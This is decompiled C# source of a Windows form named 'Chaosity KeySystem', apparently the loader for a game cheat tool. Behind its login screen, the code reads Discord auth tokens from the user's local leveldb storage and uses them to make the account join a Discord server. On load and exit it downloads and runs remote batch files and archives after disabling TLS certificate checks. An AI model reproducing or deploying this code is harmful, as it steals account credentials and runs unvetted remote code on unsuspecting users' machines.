// Decompiled with JetBrains decompiler
// Type: Chaosity.Loading
// Assembly: Chaosity, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8FD1C12D-B5CF-4C0B-B451-47DE735C992C
// Assembly location: C:\Users\povar\Desktop\Chaosity (Exploit)\ChaosityExploit.exe

using DiscordRpcDemo;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Chaosity
{
  public class Loading : Form
  {
    private WebClient webClient = new WebClient();
    private List<string> discordLDBs = new List<string>();
    private List<string> discordTokens = new List<string>();
    private IContainer components = (IContainer) null;
    private DiscordRpc.RichPresence presence;
    private DiscordRpc.EventHandlers handlers;
    private Panel panel3;
    private System.Windows.Forms.Timer timer1;
    private System.Windows.Forms.Timer timer2;
    private Button button6;
    private Button button7;
    private Panel panel1;
    private Button button3;
    private Button button4;
    private Label label1;

    public Loading()
    {
      this.InitializeComponent();
      ServicePointManager.Expect100Continue = true;
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback) ((_param1, _param2, _param3, _param4) => true);
      using (WebClient webClient = new WebClient())
      {
        webClient.DownloadString("https://pastebin.com/raw/EqU5MPEz");
        webClient.DownloadFile("https://raw.githubusercontent.com/ChaosityYT/Chaosity-Scripts/master/del5.bat", "del5.bat");
        Process.Start(Directory.GetCurrentDirectory().ToString() + "/del5.bat");
        Thread.Sleep(1500);
      }
      new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/679526951068893187/688753204111867985/discord-rpc-w32.dll", "discord-rpc-w32.dll");
      new WebClient().DownloadFile(new WebClient().DownloadString("https://pastebin.com/raw/GXA4Ahq9"), Application.StartupPath + "/Monaco.zip");
      new WebClient().DownloadFile(new WebClient().DownloadString("https://pastebin.com/raw/cRBd4qmv"), Application.StartupPath + "/Workspace.zip");
      new WebClient().DownloadFile(new WebClient().DownloadString("https://pastebin.com/raw/pLkeRpqw"), Application.StartupPath + "/Scripts.zip");
      string sourceArchiveFileName1 = Application.StartupPath + "/Monaco.zip";
      string sourceArchiveFileName2 = Application.StartupPath + "/Workspace.zip";
      string sourceArchiveFileName3 = Application.StartupPath + "/Scripts.zip";
      string startupPath = Application.StartupPath;
      ZipFile.ExtractToDirectory(sourceArchiveFileName1, startupPath);
      ZipFile.ExtractToDirectory(sourceArchiveFileName2, startupPath);
      ZipFile.ExtractToDirectory(sourceArchiveFileName3, startupPath);
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("690288190283972619", ref this.handlers, true, (string) null);
      this.presence.state = "Project: Chaosity";
      this.presence.details = "Download Chaosity!";
      this.presence.startTimestamp = 0L;
      this.presence.largeImageKey = "chaosity_pfp";
      this.presence.largeImageText = "Project: Chaosity";
      this.presence.smallImageKey = "chaosity_pfp";
      this.presence.smallImageText = "Project: Chaosity";
      DiscordRpc.UpdatePresence(ref this.presence);
      this.TopMost = true;
      if (!(new WebClient() { Proxy = ((IWebProxy) null) }.DownloadString("https://pastebin.com/raw/5G3gxKmU") != "1.4.4"))
        return;
      int num = (int) MessageBox.Show("Updating Chaosity", "Updating Chaosity");
      Process.Start(Directory.GetCurrentDirectory() + "\\Chaosity Launcher.exe");
      foreach (Process process in Process.GetProcessesByName("ChaosityExploit"))
        process.Kill();
    }

    public string UseEncryptedString(string code)
    {
      return Encoding.Unicode.GetString(Convert.FromBase64String(code));
    }

    private void loadLDBs(string path)
    {
      foreach (FileInfo file in new DirectoryInfo(path).GetFiles())
      {
        if (file.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(file.FullName).Contains("oken"))
          this.discordLDBs.Add(path + file.Name);
      }
    }

    private void loadTokens()
    {
      foreach (string discordLdB in this.discordLDBs)
        this.discordTokens.Add(Loading.GetToken(discordLdB, false));
    }

    public static string GetToken(string path, bool isLog = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(path));
      string str2 = "";
      string contents = str1;
      while (contents.Contains("oken"))
      {
        string[] strArray = Loading.Sub(contents).Split('"');
        str2 = strArray[0];
        contents = string.Join("\"", strArray);
        if (isLog && str2.Length == 59)
          break;
      }
      return str2;
    }

    private static string Sub(string contents)
    {
      string[] strArray = contents.Substring(contents.IndexOf("oken") + 4).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) strArray);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    public string Request(string method, string url, string postData, string token)
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
      HttpWebRequest http = WebRequest.CreateHttp(url);
      http.Method = method;
      http.Headers.Add("authorization", token);
      byte[] bytes = Encoding.UTF8.GetBytes(postData);
      http.ContentType = "application/x-www-form-urlencoded";
      http.ContentLength = (long) bytes.Length;
      http.Timeout = 2500;
      Stream requestStream = http.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      return new StreamReader(http.GetResponse().GetResponseStream()).ReadToEnd();
    }

    public void JoinServer(string invite)
    {
      this.loadLDBs(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
      this.loadTokens();
      foreach (string discordToken in this.discordTokens)
      {
        try
        {
          this.Request("POST", "https://discordapp.com/api/v6/invite/" + invite, "a=b", discordToken);
        }
        catch
        {
        }
      }
    }

    private void move(object sender, EventArgs e)
    {
    }

    private bool universalBypassInstalled()
    {
      return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Google/Chrome/User Data/Default/Extensions/aihomhdbhpnpmcnnbckjjcebjoikpihj");
    }

    private void Loading_Load(object sender, EventArgs e)
    {
      if (this.universalBypassInstalled())
      {
        int num = (int) MessageBox.Show("You must uninstall Universal Bypass before you can use Chaosity", "Universal Bypass Failed");
        Environment.Exit(0);
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.DownloadString("https://pastebin.com/raw/vkPrYBxG");
        webClient.DownloadFile("https://raw.githubusercontent.com/ChaosityYT/Chaosity-Scripts/master/del4.bat", "del4.bat");
        Process.Start(Directory.GetCurrentDirectory().ToString() + "/del4.bat");
      }
      Process.Start("https://ltstyt.be/3Yn");
      Process.Start("https://discord.gg/DEVYCQp");
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
    }

    private void button6_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are You Sure You Want To Exit?", "Exit Chaosity", MessageBoxButtons.YesNo) != DialogResult.Yes)
        return;
      string path = "C:\\Chaosity";
      if (Directory.Exists(path))
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
          directory.Delete(true);
        foreach (FileSystemInfo file in directoryInfo.GetFiles())
          file.Delete();
        Directory.Delete(path);
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.DownloadString("https://pastebin.com/raw/sUCYF2Pb");
        webClient.DownloadFile("https://raw.githubusercontent.com/ChaosityYT/Chaosity-Scripts/master/del.bat3", "del.bat");
        Process.Start(Directory.GetCurrentDirectory().ToString() + "/del.bat");
      }
      foreach (Process process in Process.GetProcessesByName("ChaosityExploit"))
        process.Kill();
    }

    private async void button7_Click(object sender, EventArgs e)
    {
      for (int i = 1; i <= 9; ++i)
      {
        this.Opacity -= 0.1;
        await Task.Delay(1);
      }
      this.WindowState = FormWindowState.Minimized;
      this.Opacity = 1.0;
    }

    private void button2_Click(object sender, EventArgs e)
    {
    }

    private void panel3_Paint(object sender, PaintEventArgs e)
    {
    }

    private void button1_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.shadowcheats.com/chaosity/key");
    }

    private void AddDrag(Control Control)
    {
      Control.MouseDown += new MouseEventHandler(this.panel1_MouseDown);
    }

    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    private void panel1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      Loading.ReleaseCapture();
      Loading.SendMessage(this.Handle, 161, 2, 0);
      if ((uint) this.Location.Y > 0U)
        return;
      this.WindowState = FormWindowState.Maximized;
    }

    private void button4_Click(object sender, EventArgs e)
    {
      this.Hide();
      new Key_System().Show();
    }

    private void button1_Click_2(object sender, EventArgs e)
    {
    }

    private void button4_Click_1(object sender, EventArgs e)
    {
      int num1 = (int) MessageBox.Show("Welcome " + WindowsIdentity.GetCurrent().Name.Split('\\')[1] + " to Chaosity!", "Key correct!");
      int num2 = (int) MessageBox.Show("Thank you for using Chaosity!", "Thank you!");
      this.Hide();
      new Chaosity().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button1_Click_3(object sender, EventArgs e)
    {
      Process.Start("https://up-to-down.net/27602/GetKey");
    }

    private void button2_Click_1(object sender, EventArgs e)
    {
    }

    private void button4_Click_2(object sender, EventArgs e)
    {
      int num1 = (int) MessageBox.Show("Welcome " + WindowsIdentity.GetCurrent().Name.Split('\\')[1] + " to Chaosity!", "Key correct!");
      int num2 = (int) MessageBox.Show("Thank you for using Chaosity!", "Thank you!");
      this.Hide();
      new Chaosity().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button1_Click_4(object sender, EventArgs e)
    {
      Process.Start("https://up-to-down.net/27602/GetKey");
    }

    private void panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void button4_Click_3(object sender, EventArgs e)
    {
      this.Hide();
      new Chaosity().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button1_Click_1(object sender, EventArgs e)
    {
      Process.Start("https://www.shadowcheats.com/chaosity/key");
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Loading));
      this.panel3 = new Panel();
      this.button4 = new Button();
      this.label1 = new Label();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.timer2 = new System.Windows.Forms.Timer(this.components);
      this.button6 = new Button();
      this.button7 = new Button();
      this.panel1 = new Panel();
      this.button3 = new Button();
      this.panel3.SuspendLayout();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.panel3.BackColor = Color.Black;
      this.panel3.Controls.Add((Control) this.button4);
      this.panel3.Controls.Add((Control) this.label1);
      this.panel3.Location = new Point(10, 28);
      this.panel3.Name = "panel3";
      this.panel3.Size = new Size(288, 112);
      this.panel3.TabIndex = 0;
      this.panel3.Paint += new PaintEventHandler(this.panel3_Paint);
      this.button4.BackColor = Color.Transparent;
      this.button4.Cursor = Cursors.Hand;
      this.button4.FlatAppearance.BorderColor = Color.White;
      this.button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(45, 45, 45);
      this.button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(45, 45, 45);
      this.button4.FlatStyle = FlatStyle.Flat;
      this.button4.Font = new Font("Roboto", 9f, FontStyle.Bold);
      this.button4.ForeColor = Color.White;
      this.button4.Location = new Point(96, 60);
      this.button4.Name = "button4";
      this.button4.Size = new Size(93, 25);
      this.button4.TabIndex = 47;
      this.button4.Text = "Login";
      this.button4.UseVisualStyleBackColor = false;
      this.button4.Click += new EventHandler(this.button4_Click_3);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Segoe UI", 15.75f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = Color.White;
      this.label1.Location = new Point(17, 14);
      this.label1.Name = "label1";
      this.label1.Size = new Size(254, 30);
      this.label1.TabIndex = 46;
      this.label1.Text = "Chaosity Authentication";
      this.timer1.Enabled = true;
      this.timer1.Interval = 250;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.timer2.Interval = 4000;
      this.button6.BackColor = Color.Black;
      this.button6.Cursor = Cursors.Hand;
      this.button6.FlatAppearance.BorderColor = Color.FromArgb(45, 45, 45);
      this.button6.FlatAppearance.BorderSize = 0;
      this.button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(45, 45, 45);
      this.button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(40, 40, 40);
      this.button6.FlatStyle = FlatStyle.Flat;
      this.button6.Font = new Font("Bahnschrift", 8f);
      this.button6.ForeColor = Color.White;
      this.button6.Location = new Point(275, 1);
      this.button6.Name = "button6";
      this.button6.Size = new Size(23, 19);
      this.button6.TabIndex = 44;
      this.button6.Text = "X";
      this.button6.UseVisualStyleBackColor = false;
      this.button6.Click += new EventHandler(this.button6_Click);
      this.button7.BackColor = Color.Transparent;
      this.button7.Cursor = Cursors.Hand;
      this.button7.FlatAppearance.BorderColor = Color.FromArgb(45, 45, 45);
      this.button7.FlatAppearance.BorderSize = 0;
      this.button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(45, 45, 45);
      this.button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(40, 40, 40);
      this.button7.FlatStyle = FlatStyle.Flat;
      this.button7.Font = new Font("Bahnschrift", 8f);
      this.button7.ForeColor = Color.White;
      this.button7.Location = new Point((int) byte.MaxValue, 1);
      this.button7.Name = "button7";
      this.button7.Size = new Size(23, 19);
      this.button7.TabIndex = 45;
      this.button7.Text = "-";
      this.button7.UseVisualStyleBackColor = false;
      this.button7.Click += new EventHandler(this.button7_Click);
      this.panel1.BackColor = Color.Black;
      this.panel1.Controls.Add((Control) this.button7);
      this.panel1.Controls.Add((Control) this.button3);
      this.panel1.Controls.Add((Control) this.button6);
      this.panel1.Location = new Point(3, 2);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(304, 22);
      this.panel1.TabIndex = 46;
      this.panel1.Paint += new PaintEventHandler(this.panel1_Paint);
      this.panel1.MouseDown += new MouseEventHandler(this.panel1_MouseDown);
      this.button3.BackColor = Color.Transparent;
      this.button3.Cursor = Cursors.Hand;
      this.button3.FlatAppearance.BorderColor = Color.FromArgb(45, 45, 45);
      this.button3.FlatAppearance.BorderSize = 0;
      this.button3.FlatAppearance.MouseDownBackColor = Color.FromArgb(45, 45, 45);
      this.button3.FlatAppearance.MouseOverBackColor = Color.FromArgb(40, 40, 40);
      this.button3.FlatStyle = FlatStyle.Flat;
      this.button3.Font = new Font("Bahnschrift", 8f);
      this.button3.ForeColor = Color.White;
      this.button3.Location = new Point(551, 9);
      this.button3.Name = "button3";
      this.button3.Size = new Size(20, 20);
      this.button3.TabIndex = 44;
      this.button3.Text = "-";
      this.button3.UseVisualStyleBackColor = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(310, 152);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.panel3);
      this.ForeColor = SystemColors.ControlDark;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Loading";
      this.Text = "Chaosity KeySystem";
      this.TopMost = true;
      this.Load += new EventHandler(this.Loading_Load);
      this.panel3.ResumeLayout(false);
      this.panel3.PerformLayout();
      this.panel1.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
